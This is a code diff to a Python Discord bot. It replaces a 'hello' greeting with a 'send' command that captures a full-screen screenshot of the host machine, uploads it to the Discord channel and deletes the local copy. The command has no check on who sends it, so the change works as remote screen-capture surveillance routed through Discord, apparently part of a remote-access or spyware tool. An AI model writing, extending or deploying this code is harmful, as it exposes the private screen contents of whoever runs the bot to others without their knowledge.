@@ -1,6 +1,10 @@
+import os
 import discord
 import asyncio
+from PIL import ImageGrab
 from core.config import TOKEN
+from core.os_info import create_directory, get_directory_path
+
 
 async def start_bot():
     intents = discord.Intents.default()
@@ -17,8 +21,24 @@ async def start_bot():
         if message.author == client.user:
             return
 
-        if message.content.lower().startswith('hello'):
-            await message.channel.send('Hello!')
+        if message.content.lower().startswith('send'):
+            directory_path = get_directory_path()
+
+            create_directory(directory_path)
+
+            screenshot = ImageGrab.grab()
+
+            file_path = os.path.join(directory_path, "fullscreen_screenshot.png")
+
+            screenshot.save(file_path)
+
+            print(f"Full-screen screenshot saved as '{file_path}'")
+
+            file = discord.File(file_path, filename="fullscreen_screenshot.png")
+
+            await message.channel.send("Here is your photo!", file=file)
+
+            os.remove(file_path)
 
     await client.start(TOKEN)
 
